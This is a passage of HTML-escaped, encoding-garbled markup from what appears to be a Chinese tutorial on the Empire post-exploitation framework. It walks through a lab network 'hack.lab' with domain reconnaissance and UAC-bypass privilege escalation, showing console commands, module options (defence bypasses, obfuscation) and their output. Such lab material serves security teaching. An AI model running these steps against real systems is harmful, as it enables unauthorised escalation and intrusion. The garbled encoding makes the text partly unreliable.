&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ OutputFunction â”‚ Out-String â”‚ False    â”‚ PowerShell&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s output &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Out-String&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Json&amp;#34;&lt;/span&gt;,    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Csv&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Html&amp;#34;&lt;/span&gt;,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Xml&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Range          â”‚            â”‚ False    â”‚ Range to perform reverse DNS on.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/situational_awareness/network/reverse_dns&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; CIDR
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;list assignment index out of range
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/situational_awareness/network/reverse_dns&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; CIDR 172.16.0.1/24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set CIDR to 172.16.0.1/24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/situational_awareness/network/reverse_dns&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Forest                     : hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CurrentTime                : 2022/1/19 7:58:50
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HighestCommittedUsn        : &lt;span class=&#34;m&#34;&gt;12922&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OSVersion                  : Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Datacenter Evaluation
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Roles                      : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;SchemaRole, NamingRole, PdcRole, RidRole...&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Domain                     : hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPAddress                  : fe11::50a4:1bfa:155f:1778%12
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SiteName                   : Default-First-Site-Name
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SyncFromAllServersCallback : 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;InboundConnections         : &lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OutboundConnections        : &lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name                       : DC.hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Partitions                 : &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;hack,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lab, &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;hack,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lab, &lt;span class=&#34;nv&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;hack,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                             , &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;hack,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lab...&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;æƒé™æå‡&#34;&gt;æƒé™æå‡&lt;/h2&gt;
&lt;p&gt;empireå½“ç„¶ä¹Ÿæœ‰å†…ç½®æƒé™æå‡çš„åŠŸèƒ½ï¼Œä¸»è¦æ˜¯æ¯”è¾ƒå¸¸è§çš„Bypass UACã€PowerUPçš„æ¼æ´æ£€æµ‹æ¨¡å—ç­‰&lt;/p&gt;
&lt;h3 id=&#34;bypass-uac&#34;&gt;Bypass UAC&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªåŠŸèƒ½ä¸»è¦æ˜¯ç”¨æˆ·åœ¨ç”¨æˆ·ç»„çš„æ—¶å€™ï¼Œä¸»æœºå¼€å¯äº†ç”¨æˆ·æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½è·å–åˆ°å®Œå…¨çš„æƒé™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(Empire: VUXT7WBZ) &amp;gt; bypassuac test
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Tasked VUXT7WBZ to run Task 8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Task 8 results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: 5CTNK7
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œå®Œæ¯•ä¼šåœ¨&lt;code&gt;agents&lt;/code&gt;åˆ—è¡¨ä¸­å‡ºç°å¸¦æ˜Ÿå·çš„å°±æ˜¯æˆåŠŸäº†&lt;/p&gt;
&lt;h3 id=&#34;bypassuac_wscript&#34;&gt;bypassuac_wscript&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªä¸»è¦æ˜¯åˆ©ç”¨&lt;code&gt;c:\windows\wscript.exe&lt;/code&gt;æ‰§è¡Œpayloadï¼Œåªæ˜¯é€‚ç”¨äºç±»ä¼¼window7çš„è€ä¸€ç‚¹çš„ç³»ç»Ÿï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: XR6MK1Y3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/privesc/bypassuac_wscript
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to XR6MK1Y3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @enigma0x3                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              @harmyj0y                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              Vozzie                                                                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     http://seclist.us/uac-bypass-vulnerability-in-the-windows-script-     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              host.html                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              https://github.com/Vozzie/uacscript                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Drops wscript.exe and a custom manifest into C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;and &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              proceeds to execute VBScript using the wscript executablewith the new 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              manifest. The VBScript executed by C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;script.exe will run    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              elevated.                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/privesc/bypassuac_wscript                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    False                                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1088                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name             â”‚ Value              â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent            â”‚ XR6MK1Y3           â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Bypasses         â”‚ mattifestation etw â”‚ False    â”‚ Bypasses as a space separated list  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ to be prepended to the launcher.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Listener         â”‚ &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;               â”‚ True     â”‚ Listener to use.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Obfuscate        â”‚ False              â”‚ False    â”‚ Switch. Obfuscate the launcher      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ powershell code, uses the           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ ObfuscateCommand &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; obfuscation    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ types. For powershell only.         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ObfuscateCommand â”‚ Token&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ll&lt;span class=&#34;se&#34;&gt;\1&lt;/span&gt;        â”‚ False    â”‚ The Invoke-Obfuscation &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ use. Only used &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; Obfuscate switch  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ is True. For powershell only.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Proxy            â”‚ default            â”‚ False    â”‚ Proxy to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ none, or other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ProxyCreds       â”‚ default            â”‚ False    â”‚ Proxy credentials                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;username:password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserAgent        â”‚ default            â”‚ False    â”‚ User-agent string to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ staging request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/privesc/bypassuac_wscript&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked XR6MK1Y3 to run Task &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: 6TGMCB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; New agent D6XC87Y9 checked in
